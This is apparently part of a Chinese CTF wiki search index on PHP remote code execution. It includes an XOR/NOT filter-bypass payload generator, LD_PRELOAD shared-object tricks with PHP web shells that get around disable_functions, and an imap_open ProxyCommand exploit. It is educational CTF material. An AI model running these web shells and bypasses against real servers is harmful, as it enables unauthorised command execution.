\u770b\u5230\u4e0a\u9762\u8fd9\u4e2a\u4e86\u5417\uff0c\u6bd4\u8f83\u7279\u6b8a\u6307\u7684\u662f /bin/base64 \u5f53\u7136\u4e0d\u662f\u6bcf\u4e2a\u7cfb\u7edf\u90fd\u6709","title":"\u901a\u914d\u7b26"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884c\u5176\u4ed6\u597d\u6587\u63a8\u8350/","text":"\u547d\u4ee4\u6267\u884c\u597d\u6587\u63a8\u8350 \u00b6 \u8fd9\u91cc\u5f88\u63a8\u8350\u8be6\u7ec6\u9605\u8bfb\u4e0b\u9762\u4e24\u7bc7\u6765\u81eaPhithon\u5927\u725b\u7684\u6587\u7ae0 \u4e00\u4e9b\u4e0d\u5305\u542b\u6570\u5b57\u548c\u5b57\u6bcd\u7684webshell \u65e0\u5b57\u6bcd\u6570\u5b57webshell\u4e4b\u63d0\u9ad8\u7bc7","title":"\u547d\u4ee4\u6267\u884c\u597d\u6587\u63a8\u8350"},{"location":"CTFWiki/Web/RCE/\u547d\u4ee4\u6267\u884c\u5176\u4ed6\u597d\u6587\u63a8\u8350/#_1","text":"\u8fd9\u91cc\u5f88\u63a8\u8350\u8be6\u7ec6\u9605\u8bfb\u4e0b\u9762\u4e24\u7bc7\u6765\u81eaPhithon\u5927\u725b\u7684\u6587\u7ae0 \u4e00\u4e9b\u4e0d\u5305\u542b\u6570\u5b57\u548c\u5b57\u6bcd\u7684webshell \u65e0\u5b57\u6bcd\u6570\u5b57webshell\u4e4b\u63d0\u9ad8\u7bc7","title":"\u547d\u4ee4\u6267\u884c\u597d\u6587\u63a8\u8350"},{"location":"CTFWiki/Web/RCE/\u5f02\u6216\u53d6\u53cd\u6216\u7ed5\u8fc7/","text":"\u5f02\u6216\u3001\u53d6\u53cd\u3001\u6216\u7ed5\u8fc7 \u00b6 \u5728\u8fd9\u4e4b\u524d\u8bf4\u4e00\u4e0burl\u7f16\u7801\u662f%\u52a0\u4e0a\u5176\u5b57\u7b26\u768416\u8fdb\u5236 \u770b\u770b\u4e0b\u9762\u8fd9\u6837\u7684\u60c5\u51b5 <?php if ( isset ( $_POST [ 'c' ])){ $c = $_POST [ 'c' ]; if ( ! preg_match ( '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i' , $c )){ eval ( \"echo( $c );\" ); } } else { highlight_file ( __FILE__ ); } ?> \u53ef\u89c1\u5b57\u7b26\u90fd\u6ca1\u4e86\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u91c7\u53d6\u5f02\u6216\u3001\u53d6\u53cd\u3001\u6216\u7ed5\u8fc7\u5b9e\u73b0rce\u4e86 \u539f\u7406\u5c31\u662f\u5c06\u4e0d\u53ef\u89c1\u5b57\u7b26\u8f6c\u4e8c\u8fdb\u5236\u8fdb\u884c\u5f02\u6216\u3001\u53d6\u53cd\u3001\u6216\u64cd\u4f5c\u4e86\u8fd9\u4e09\u4e2a\u8bf7\u81ea\u884c\u767e\u5ea6 echo urldecode(\"%08\")^urldecode(\"%7b\"); \u8f93\u51fa\u4e3as \u539f\u7406 %08-0001000 %7b-1111011 \u5f02\u6216\u5f97\u5230 %73-1110011 \u6216\u8fd0\u7b97\u540c\u7406 \u63a5\u4e0b\u6765\u662f\u53d6\u53cd\uff0c\u8fd9\u4e2a\u5c31\u66f4\u597d\u7406\u89e3\u4e86 ~%8C\u4ee3\u8868s %8C-10001100 \u9010\u4f4d\u53d6\u53cd %73-01110011 \u4e0b\u9762\u662f\u6211\u81ea\u5df1\u5199\u7684\u811a\u672c <?php /* # -*- coding: utf-8 -*- # @Author: Y4tacker # @Date: 2020-11-21 20:31:22 */ //\u6216 function orRce ( $par1 , $par2 ){ $result = ( urldecode ( $par1 ) | urldecode ( $par2 )); return $result ; } //\u5f02\u6216 function xorRce ( $par1 , $par2 ){ $result = ( urldecode ( $par1 ) ^ urldecode ( $par2 )); return $result ; } //\u53d6\u53cd function negateRce (){ fwrite ( STDOUT , '[+]your function: ' ); $system = str_replace ( array ( \" \\r\\n \" , \" \\r \" , \" \\n \" ), \"\" , fgets ( STDIN )); fwrite ( STDOUT , '[+]your command: ' ); $command = str_replace ( array ( \" \\r\\n \" , \" \\r \" , \" \\n \" ), \"\" , fgets ( STDIN )); echo '[*] (~' . urlencode ( ~ $system ) . ')(~' . urlencode ( ~ $command ) . ');' ; } //mode=1\u4ee3\u8868\u6216\uff0c2\u4ee3\u8868\u5f02\u6216\uff0c3\u4ee3\u8868\u53d6\u53cd //\u53d6\u53cd\u7684\u8bdd\uff0c\u5c31\u6ca1\u5fc5\u8981\u751f\u6210\u5b57\u7b26\u53bb\u8dd1\u4e86\uff0c\u56e0\u4e3a\u672c\u6765\u5c31\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\uff0c\u76f4\u63a5\u7ed5\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f function generate ( $func , $cmd , $mode , $preg = '/[0-9]/i' ){ $temp = []; if ( $mode != 3 ){ for ( $i = 0 ; $i < 256 ; $i ++ ){ for ( $j = 0 ; $j < 256 ; $j ++ ){ if ( $i < 16 ){ $hex_i = '0' . dechex ( $i ); } else { $hex_i = dechex ( $i ); } if ( $j < 16 ){ $hex_j = '0' . dechex ( $j ); } else { $hex_j = dechex ( $j ); } if ( preg_match ( $preg , hex2bin ( $hex_i )) || preg_match ( $preg , hex2bin ( $hex_j ))){ echo \"\" ; } else { $par1 = \"%\" . $hex_i ; $par2 = '%' . $hex_j ; $res = '' ; if ( $mode == 1 ){ $res = orRce ( $par1 , $par2 ); } else if ( $mode == 2 ){ $res = xorRce ( $par1 , $par2 ); } if ( ord ( $res ) >= 32 & ord ( $res ) <= 126 ){ if (( strtoupper ( $res ) === $res )){ } else { if ( $temp [ $res ] == null ){ $temp [ $res ] = \" $par1 | $par2 \" ; } } } } } } $res = \"(func^tion)(cmd^line);\" ; $par1 = \"\" ; $par2 = \"\" ; $par3 = \"\" ; $par4 = \"\" ; for ( $i = 0 ; $i < strlen ( $func ); $i ++ ){ $expl = explode ( \"|\" , $temp [ $func [ $i ]]); $par1 .= $expl [ 0 ]; $par2 .= $expl [ 1 ]; } for ( $i = 0 ; $i < strlen ( $cmd ); $i ++ ){ $expl = explode ( \"|\" , $temp [ $cmd [ $i ]]); $par3 .= $expl [ 0 ]; $par4 .= $expl [ 1 ]; } $res = preg_replace ( \"/func/\" , \" \\\" $par1\\ \"\", $res ); $res = preg_replace(\" / tion / \",\" \\ \" $par2\\ \"\", $res ); $res = preg_replace(\" / cmd / \",\" \\ \" $par3\\ \"\", $res ); $res = preg_replace(\" / line / \",\" \\ \" $par4\\ \"\", $res ); echo $res ; // var_dump( $temp ); }else{ negateRce(); } } generate(\" system \",\" ls \",2,\" / [ a - z0 - 9 ] / i \");","title":"\u5f02\u6216\u3001\u53d6\u53cd\u3001\u6216\u7ed5\u8fc7"},{"location":"CTFWiki/Web/RCE/\u5f02\u6216\u53d6\u53cd\u6216\u7ed5\u8fc7/#_1","text":"\u5728\u8fd9\u4e4b\u524d\u8bf4\u4e00\u4e0burl\u7f16\u7801\u662f%\u52a0\u4e0a\u5176\u5b57\u7b26\u768416\u8fdb\u5236 \u770b\u770b\u4e0b\u9762\u8fd9\u6837\u7684\u60c5\u51b5 <?php if ( isset ( $_POST [ 'c' ])){ $c = $_POST [ 'c' ]; if ( ! preg_match ( '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i' , $c )){ eval ( \"echo( $c );\" ); } } else { highlight_file ( __FILE__ ); } ?> \u53ef\u89c1\u5b57\u7b26\u90fd\u6ca1\u4e86\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u91c7\u53d6\u5f02\u6216\u3001\u53d6\u53cd\u3001\u6216\u7ed5\u8fc7\u5b9e\u73b0rce\u4e86 \u539f\u7406\u5c31\u662f\u5c06\u4e0d\u53ef\u89c1\u5b57\u7b26\u8f6c\u4e8c\u8fdb\u5236\u8fdb\u884c\u5f02\u6216\u3001\u53d6\u53cd\u3001\u6216\u64cd\u4f5c\u4e86\u8fd9\u4e09\u4e2a\u8bf7\u81ea\u884c\u767e\u5ea6 echo urldecode(\"%08\")^urldecode(\"%7b\"); \u8f93\u51fa\u4e3as \u539f\u7406 %08-0001000 %7b-1111011 \u5f02\u6216\u5f97\u5230 %73-1110011 \u6216\u8fd0\u7b97\u540c\u7406 \u63a5\u4e0b\u6765\u662f\u53d6\u53cd\uff0c\u8fd9\u4e2a\u5c31\u66f4\u597d\u7406\u89e3\u4e86 ~%8C\u4ee3\u8868s %8C-10001100 \u9010\u4f4d\u53d6\u53cd %73-01110011 \u4e0b\u9762\u662f\u6211\u81ea\u5df1\u5199\u7684\u811a\u672c <?php /* # -*- coding: utf-8 -*- # @Author: Y4tacker # @Date: 2020-11-21 20:31:22 */ //\u6216 function orRce ( $par1 , $par2 ){ $result = ( urldecode ( $par1 ) | urldecode ( $par2 )); return $result ; } //\u5f02\u6216 function xorRce ( $par1 , $par2 ){ $result = ( urldecode ( $par1 ) ^ urldecode ( $par2 )); return $result ; } //\u53d6\u53cd function negateRce (){ fwrite ( STDOUT , '[+]your function: ' ); $system = str_replace ( array ( \" \\r\\n \" , \" \\r \" , \" \\n \" ), \"\" , fgets ( STDIN )); fwrite ( STDOUT , '[+]your command: ' ); $command = str_replace ( array ( \" \\r\\n \" , \" \\r \" , \" \\n \" ), \"\" , fgets ( STDIN )); echo '[*] (~' . urlencode ( ~ $system ) . ')(~' . urlencode ( ~ $command ) . ');' ; } //mode=1\u4ee3\u8868\u6216\uff0c2\u4ee3\u8868\u5f02\u6216\uff0c3\u4ee3\u8868\u53d6\u53cd //\u53d6\u53cd\u7684\u8bdd\uff0c\u5c31\u6ca1\u5fc5\u8981\u751f\u6210\u5b57\u7b26\u53bb\u8dd1\u4e86\uff0c\u56e0\u4e3a\u672c\u6765\u5c31\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\uff0c\u76f4\u63a5\u7ed5\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f function generate ( $func , $cmd , $mode , $preg = '/[0-9]/i' ){ $temp = []; if ( $mode != 3 ){ for ( $i = 0 ; $i < 256 ; $i ++ ){ for ( $j = 0 ; $j < 256 ; $j ++ ){ if ( $i < 16 ){ $hex_i = '0' . dechex ( $i ); } else { $hex_i = dechex ( $i ); } if ( $j < 16 ){ $hex_j = '0' . dechex ( $j ); } else { $hex_j = dechex ( $j ); } if ( preg_match ( $preg , hex2bin ( $hex_i )) || preg_match ( $preg , hex2bin ( $hex_j ))){ echo \"\" ; } else { $par1 = \"%\" . $hex_i ; $par2 = '%' . $hex_j ; $res = '' ; if ( $mode == 1 ){ $res = orRce ( $par1 , $par2 ); } else if ( $mode == 2 ){ $res = xorRce ( $par1 , $par2 ); } if ( ord ( $res ) >= 32 & ord ( $res ) <= 126 ){ if (( strtoupper ( $res ) === $res )){ } else { if ( $temp [ $res ] == null ){ $temp [ $res ] = \" $par1 | $par2 \" ; } } } } } } $res = \"(func^tion)(cmd^line);\" ; $par1 = \"\" ; $par2 = \"\" ; $par3 = \"\" ; $par4 = \"\" ; for ( $i = 0 ; $i < strlen ( $func ); $i ++ ){ $expl = explode ( \"|\" , $temp [ $func [ $i ]]); $par1 .= $expl [ 0 ]; $par2 .= $expl [ 1 ]; } for ( $i = 0 ; $i < strlen ( $cmd ); $i ++ ){ $expl = explode ( \"|\" , $temp [ $cmd [ $i ]]); $par3 .= $expl [ 0 ]; $par4 .= $expl [ 1 ]; } $res = preg_replace ( \"/func/\" , \" \\\" $par1\\ \"\", $res ); $res = preg_replace(\" / tion / \",\" \\ \" $par2\\ \"\", $res ); $res = preg_replace(\" / cmd / \",\" \\ \" $par3\\ \"\", $res ); $res = preg_replace(\" / line / \",\" \\ \" $par4\\ \"\", $res ); echo $res ; // var_dump( $temp ); }else{ negateRce(); } } generate(\" system \",\" ls \",2,\" / [ a - z0 - 9 ] / i \");","title":"\u5f02\u6216\u3001\u53d6\u53cd\u3001\u6216\u7ed5\u8fc7"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/","text":"\u7ed5\u8fc7disable_functions \u00b6 \u6709\u5f88\u591a\u65f6\u5019\u6211\u4eec\u62ff\u5230\u4e00\u4e2ashell\u5374\u5f88\u65e0\u80fd\u4e3a\u529b \u56e0\u4e3a\u4ed6\u7981\u7528\u4e86\u592a\u591a\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u8981\u53bb\u601d\u8003\u5982\u4f55\u7ed5\u8fc7 \u9ed1\u540d\u5355\u7ed5\u8fc7 \u00b6 \u5373\u4fbf\u662f\u901a\u8fc7disable functions\u9650\u5236\u5371\u9669\u51fd\u6570\uff0c\u4e5f\u53ef\u80fd\u4f1a\u6709\u9650\u5236\u4e0d\u5168\u7684\u60c5\u51b5\u3002\u5982\u679c\u8fd0\u7ef4\u4eba\u5458\u5b89\u5168\u610f\u8bc6\u4e0d\u5f3a\u6216\u5bf9PHP\u4e0d\u751a\u4e86\u89e3\u7684\u8bdd\uff0c\u5219\u5f88\u6709\u53ef\u80fd\u5ffd\u7565\u67d0\u4e9b\u5371\u9669\u51fd\u6570\uff0c\u5e38\u89c1\u7684\u6709\u4ee5\u4e0b\u51e0\u79cd exec()\u3001shell_exec()\u3001system()\u3001passthru()\u3001popen()\u3001proc_open()\u3001pcntl_exec \u8fd9\u51e0\u4e2a\u51fd\u6570\u5177\u4f53\u5982\u4f55\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u81ea\u884c\u641c\u7d22 \u5229\u7528 LD_PRELOAD \u73af\u5883\u53d8\u91cf \u00b6 LD_PRELOAD\u7b80\u4ecb \u00b6 LD_PRELOAD\u662fLinux\u7cfb\u7edf\u7684\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5b83\u53ef\u4ee5\u5f71\u54cd\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6\u7684\u94fe\u63a5\uff08Runtime linker\uff09\uff0c\u5b83\u5141\u8bb8\u4f60\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u4e2a\u529f\u80fd\u4e3b\u8981\u5c31\u662f\u7528\u6765\u6709\u9009\u62e9\u6027\u7684\u8f7d\u5165\u4e0d\u540c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u76f8\u540c\u51fd\u6570\u3002\u901a\u8fc7\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e3b\u7a0b\u5e8f\u548c\u5176\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4e2d\u95f4\u52a0\u8f7d\u522b\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u751a\u81f3\u8986\u76d6\u6b63\u5e38\u7684\u51fd\u6570\u5e93\u3002\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u529f\u80fd\u6765\u4f7f\u7528\u81ea\u5df1\u7684\u6216\u662f\u66f4\u597d\u7684\u51fd\u6570\uff08\u65e0\u9700\u522b\u4eba\u7684\u6e90\u7801\uff09\uff0c\u800c\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4ee5\u5411\u522b\u4eba\u7684\u7a0b\u5e8f\u6ce8\u5165\u7a0b\u5e8f\uff0c\u4ece\u800c\u8fbe\u5230\u7279\u5b9a\u7684\u653b\u51fb\u76ee\u7684\u3002 \u6211\u4eec\u901a\u8fc7\u73af\u5883\u53d8\u91cf LD_PRELOAD \u52ab\u6301\u7cfb\u7edf\u51fd\u6570\uff0c\u53ef\u4ee5\u8fbe\u5230\u4e0d\u8c03\u7528 PHP \u7684\u5404\u79cd\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff08system()\u3001exec() \u7b49\u7b49\uff09\u4ecd\u53ef\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u76ee\u7684\u3002 \u5229\u7528\u6761\u4ef6 \u00b6 mail()\u51fd\u6570\u548cerror_log()\u51fd\u6570\u6240\u8c03\u7528\u7684sendmail\u5df2\u5b89\u88c5 \u4e0d\u9650\u5236 /usr/sbin/sendmail \u7684\u6267\u884c mail()\u51fd\u6570\u548cerror_log()\u51fd\u6570\u6709\u4e00\u4e2a\u672a\u88ab\u7981\u7528 \u52ab\u6301getuid() \u00b6 \u524d\u63d0\u662f\u5728Linux\u4e2d\u5df2\u5b89\u88c5\u5e76\u542f\u7528sendmail\u7a0b\u5e8f\u3002 php\u7684mail()\u51fd\u6570\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u9ed8\u8ba4\u8c03\u7528\u7cfb\u7edf\u7a0b\u5e8f/usr/sbin/sendmail\uff0c\u800c/usr/sbin/sendmail\u4f1a\u8c03\u7528getuid()\u3002\u5982\u679c\u6211\u4eec\u80fd\u901a\u8fc7LD_PRELOAD\u7684\u65b9\u5f0f\u6765\u52ab\u6301getuid()\uff0c\u518d\u7528mail()\u51fd\u6570\u6765\u89e6\u53d1sendmail\u7a0b\u5e8f\u8fdb\u800c\u6267\u884c\u88ab\u52ab\u6301\u7684getuid()\uff0c\u4ece\u800c\u5c31\u80fd\u6267\u884c\u6076\u610f\u4ee3\u7801\u4e86\u3002 \u7f16\u5199\u4e00\u4e2a\u539f\u578b\u4e3a uid_t getuid(void); \u7684 C \u51fd\u6570\uff0c\u5185\u90e8\u6267\u884c\u653b\u51fb\u8005\u6307\u5b9a\u7684\u4ee3\u7801\uff0c\u5e76\u7f16\u8bd1\u6210\u5171\u4eab\u5bf9\u8c61 a.so\uff1b \u8fd0\u884c PHP \u51fd\u6570 putenv()\uff0c\u8bbe\u5b9a\u73af\u5883\u53d8\u91cf LD_PRELOAD \u4e3a a.so\uff0c\u4ee5\u4fbf\u540e\u7eed\u542f\u52a8\u65b0\u8fdb\u7a0b\u65f6\u4f18\u5148\u52a0\u8f7d\u8be5\u5171\u4eab\u5bf9\u8c61\uff1b \u8fd0\u884c PHP \u7684 mail() \u51fd\u6570\uff0cmail() \u5185\u90e8\u542f\u52a8\u65b0\u8fdb\u7a0b /usr/sbin/sendmail\uff0c\u7531\u4e8e\u4e0a\u4e00\u6b65 LD_PRELOAD \u7684\u4f5c\u7528\uff0csendmail \u8c03\u7528\u7684\u7cfb\u7edf\u51fd\u6570 getuid() \u88ab\u4f18\u5148\u7ea7\u66f4\u597d\u7684 a.so \u4e2d\u7684\u540c\u540d getuid() \u6240\u52ab\u6301\uff1b \u8fbe\u5230\u4e0d\u8c03\u7528 PHP \u7684\u5404\u79cd\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff08system()\u3001exec() \u7b49\u7b49\uff09\u4ecd\u53ef\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u76ee\u7684 \u9996\u5148\u7f16\u5199test.c\uff0c\u52ab\u6301getuid()\u51fd\u6570\uff0c\u83b7\u53d6LD_PRELOAD\u73af\u5883\u53d8\u91cf\u5e76\u9884\u52a0\u8f7d\u6076\u610f\u7684\u5171\u4eab\u5e93\uff0c\u518d\u5220\u9664\u73af\u5883\u53d8\u91cf LD_PRELOAD\uff0c\u6700\u540e\u6267\u884c\u7531EVIL_CMDLINE\u73af\u5883\u53d8\u91cf\u83b7\u53d6\u7684\u7cfb\u7edf\u547d\u4ee4 #include <stdlib.h> #include <stdio.h> #include <string.h> int geteuid () { const char * cmdline = getenv ( \"EVIL_CMDLINE\" ); if ( getenv ( \"LD_PRELOAD\" ) == NULL ) { return 0 ; } unsetenv ( \"LD_PRELOAD\" ); system ( cmdline ); } \u5f53\u8fd9\u4e2a\u5171\u4eab\u5e93\u4e2d\u7684getuid()\u88ab\u8c03\u7528\u65f6\uff0c\u5c1d\u8bd5\u52a0\u8f7dpayload()\u51fd\u6570\u6267\u884c\u547d\u4ee4\u3002 \u63a5\u7740\u7528\u4ee5\u4e0b\u8bed\u53e5\u7f16\u8bd1C\u6587\u4ef6\u4e3a\u5171\u4eab\u5bf9\u8c61\u6587\u4ef6\uff1a gcc -shared -fPIC test.c -o test.so \u6700\u540e\u7f16\u5199test.php\uff1a <?php $cmd = $_GET [ \"cmd\" ]; $out_path = $_GET [ \"outpath\" ]; $evil_cmdline = $cmd . \" > \" . $out_path . \" 2>&1\" ; echo \"<p> <b>cmdline</b>: \" . $evil_cmdline . \"</p>\" ; putenv ( \"EVIL_CMDLINE=\" . $evil_cmdline ); $so_path = $_GET [ \"sopath\" ]; putenv ( \"LD_PRELOAD=\" . $so_path ); mail ( \"\" , \"\" , \"\" , \"\" ); echo \"<p> <b>output</b>: <br />\" . nl2br ( file_get_contents ( $out_path )) . \"</p>\" ; unlink ( $out_path ); ?> \u8fd9\u91cc\u63a5\u53d73\u4e2a\u53c2\u6570\uff0c\u4e00\u662fcmd\u53c2\u6570\uff0c\u5f85\u6267\u884c\u7684\u7cfb\u7edf\u547d\u4ee4\uff1b\u4e8c\u662foutpath\u53c2\u6570\uff0c\u4fdd\u5b58\u547d\u4ee4\u6267\u884c\u8f93\u51fa\u7ed3\u679c\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u4fbf\u4e8e\u5728\u9875\u9762\u4e0a\u663e\u793a\uff0c\u53e6\u5916\u8be5\u53c2\u6570\uff0c\u4f60\u5e94\u6ce8\u610fweb\u662f\u5426\u6709\u8bfb\u5199\u6743\u9650\u3001web\u662f\u5426\u53ef\u8de8\u76ee\u5f55\u8bbf\u95ee\u3001\u6587\u4ef6\u5c06\u88ab\u8986\u76d6\u548c\u5220\u9664\u7b49\u51e0\u70b9\uff1b\u4e09\u662fsopath\u53c2\u6570\uff0c\u6307\u5b9a\u52ab\u6301\u7cfb\u7edf\u51fd\u6570\u7684\u5171\u4eab\u5bf9\u8c61\u7684\u7edd\u5bf9\u8def\u5f84\u3002 \u8fd9\u91cc\u901a\u8fc7putenv()\u51fd\u6570\u5c06LD_PRELOAD\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u6076\u610f\u7684test.so\u3001\u5c06\u81ea\u5b9a\u4e49\u7684EVIL_CMDLINE\u73af\u5883\u53d8\u91cf\u8d4b\u503c\u4e3a\u8981\u6267\u884c\u7684\u547d\u4ee4\uff1b\u7136\u540e\u8c03\u7528mail()\u51fd\u6570\u89e6\u53d1sendmail()\uff0c\u518d\u901a\u8fc7sendmail()\u89e6\u53d1getuid()\u4ece\u800c\u4f7f\u6076\u610f\u7684test.so\u88ab\u52a0\u8f7d\u6267\u884c\uff1b\u6700\u540e\u518d\u8f93\u51fa\u5185\u5bb9\u5230\u9875\u9762\u4e0a\u5e76\u5220\u9664\u4e34\u65f6\u5b58\u653e\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u7684\u6587\u4ef6\u3002 \u8bbf\u95eetest.php\uff0c\u8f93\u5165\u76f8\u5e94\u7684\u53c2\u6570\u5373\u53ef\u6267\u884c\u6210\u529f \u52ab\u6301\u542f\u52a8\u8fdb\u7a0b \u00b6 \u7b2c\u4e00\u79cd\u65b9\u6cd5\u662f\u52ab\u6301getuid()\uff0c\u662f\u8f83\u4e3a\u5e38\u7528\u7684\u65b9\u6cd5\uff0c\u4f46\u5b58\u5728\u7f3a\u9677\uff1a \u76ee\u6807Linux\u672a\u5b89\u88c5\u6216\u4e3a\u542f\u7528sendmail\uff1b \u5373\u4fbf\u76ee\u6807\u53ef\u4ee5\u542f\u7528sendmail\uff0c\u7531\u4e8e\u672a\u5c06\u4e3b\u673a\u540d\u6dfb\u52a0\u8fdbhosts\u4e2d\uff0c\u5bfc\u81f4\u6bcf\u6b21\u8fd0\u884csendmail\u90fd\u8981\u8017\u65f6\u534a\u5206\u949f\u7b49\u5f85\u57df\u540d\u89e3\u6790\u8d85\u65f6\u8fd4\u56de\uff0cwww-data\u4e5f\u65e0\u6cd5\u5c06\u4e3b\u673a\u540d\u52a0\u5165hosts\uff1b \u7f16\u5199bypass_disablefunc.c #define _GNU_SOURCE #include <stdlib.h> #include <stdio.h> #include <string.h> extern char ** environ ; __attribute__ (( __constructor__ )) void preload ( void ) { // get command line options and arg const char * cmdline = getenv ( \"EVIL_CMDLINE\" ); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i ; for ( i = 0 ; environ [ i ]; ++ i ) { if ( strstr ( environ [ i ], \"LD_PRELOAD\" )) { environ [ i ][ 0 ] = '\\0' ; } } // executive command system ( cmdline ); } \u63a5\u7740\u7528\u4ee5\u4e0b\u8bed\u53e5\u7f16\u8bd1C\u6587\u4ef6\u4e3a\u5171\u4eab\u5bf9\u8c61\u6587\u4ef6\uff1a gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so bypass_disablefunc.php\uff0c\u4ee3\u7801\u548ctest.php\u4e00\u81f4\uff1a <?php $cmd = $_GET [ \"cmd\" ]; $out_path = $_GET [ \"outpath\" ]; $evil_cmdline = $cmd . \" > \" . $out_path . \" 2>&1\" ; echo \"<p> <b>cmdline</b>: \" . $evil_cmdline . \"</p>\" ; putenv ( \"EVIL_CMDLINE=\" . $evil_cmdline ); $so_path = $_GET [ \"sopath\" ]; putenv ( \"LD_PRELOAD=\" . $so_path ); mail ( \"\" , \"\" , \"\" , \"\" ); echo \"<p> <b>output</b>: <br />\" . nl2br ( file_get_contents ( $out_path )) . \"</p>\" ; unlink ( $out_path ); ?> \u5229\u7528imap_open()\u7ed5\u8fc7 \u00b6 \u5b89\u88c5PHP\u7684imap\u6269\u5c55\uff1a apt-get install php-imap \uff1b\u5728php.ini\u4e2d\u5f00\u542fimap.enable_insecure_rsh\u9009\u9879\u4e3aOn\uff1b\u91cd\u542f\u670d\u52a1\u3002 \u6210\u529f\u914d\u7f6e\u597d\u73af\u5883\u540e\uff0c\u5728phpinfo\u4e2d\u4f1a\u770b\u5230\u5982\u4e0b\u4fe1\u606f\uff1a \u57fa\u672c\u539f\u7406 \u00b6 PHP \u7684imap_open\u51fd\u6570\u4e2d\u7684\u6f0f\u6d1e\u53ef\u80fd\u5141\u8bb8\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u8be5\u6f0f\u6d1e\u7684\u5b58\u5728\u662f\u56e0\u4e3a\u53d7\u5f71\u54cd\u7684\u8f6f\u4ef6\u7684imap_open\u51fd\u6570\u5728\u5c06\u90ae\u7bb1\u540d\u79f0\u4f20\u9012\u7ed9rsh\u6216ssh\u547d\u4ee4\u4e4b\u524d\u4e0d\u6b63\u786e\u5730\u8fc7\u6ee4\u90ae\u7bb1\u540d\u79f0\u3002\u5982\u679c\u542f\u7528\u4e86rsh\u548cssh\u529f\u80fd\u5e76\u4e14rsh\u547d\u4ee4\u662fssh\u547d\u4ee4\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5411\u76ee\u6807\u7cfb\u7edf\u53d1\u9001\u5305\u542b-oProxyCommand\u53c2\u6570\u7684\u6076\u610fIMAP\u670d\u52a1\u5668\u540d\u79f0\u6765\u5229\u7528\u6b64\u6f0f\u6d1e\u3002\u6210\u529f\u7684\u653b\u51fb\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u7ed5\u8fc7\u5176\u4ed6\u7981\u7528\u7684exec \u53d7\u5f71\u54cd\u8f6f\u4ef6\u4e2d\u7684\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8fd9\u4e9b\u529f\u80fd\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610fshell\u547d\u4ee4\u3002\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u529f\u80fd\u4ee3\u7801\u662fMetasploit Framework\u7684\u4e00\u90e8\u5206\u3002 exp\u5982\u4e0b\uff0c\u5148\u5224\u65ad\u662f\u5426\u5b58\u5728imap_open()\u51fd\u6570\uff0c\u7136\u540e\u6784\u9020exp\u6267\u884c\u901a\u8fc7\u5916\u90e8GET\u8f93\u5165\u7684\u547d\u4ee4\u7136\u540e\u4fdd\u5b58\u7ed3\u679c\u5230\u672c\u5730\u6587\u4ef6\u4e2d\uff0c\u6700\u540e\u8f93\u51fa\u7ed3\u679c\u6587\u4ef6\u5185\u5bb9\uff0c\u6ce8\u610fsleep(5)\u662f\u4e3a\u4e86\u7b49imap_open()\u51fd\u6570\u6267\u884c\u5b8c\u3001\u56e0\u4e3a\u8be5\u51fd\u6570\u6267\u884c\u65f6\u9700\u8981DNS\u8f6e\u8be2\u4f1a\u5b58\u5728\u5ef6\u65f6\uff1a <?php error_reporting ( 0 ); if ( ! function_exists ( 'imap_open' )) { die ( \"no imap_open function!\" ); } $server = \"x -oProxyCommand=echo \\t \" . base64_encode ( $_GET [ 'cmd' ] . \">/tmp/cmd_result\" ) . \"|base64 \\t -d|sh}\" ; //$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . \">/tmp/cmd_result\") . '|base64$IFS$()-d|sh}'; imap_open ( '{' . $server . ':143/imap}INBOX' , '' , '' ); // or var_dump(\"\\n\\nError: \".imap_last_error()); sleep ( 5 ); echo file_get_contents ( \"/tmp/cmd_result\" ); ?> 